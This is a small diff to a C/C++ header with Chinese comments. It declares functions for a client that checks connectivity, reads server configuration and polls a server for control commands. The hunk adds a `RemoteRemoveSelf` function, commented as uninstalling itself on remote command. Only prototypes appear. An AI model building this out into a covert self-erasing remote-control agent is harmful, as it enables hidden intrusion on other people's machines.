@@ -101,6 +101,9 @@ bool CheckInternet();
 //获取服务器IP，用户名等配置信息
 bool GetConfig();
 
+//执行远程命令，卸载自身
+void RemoteRemoveSelf();
+
 //获取并处理服务器控制命令线程
 DWORD _stdcall GetServerCommand(LPVOID);
 
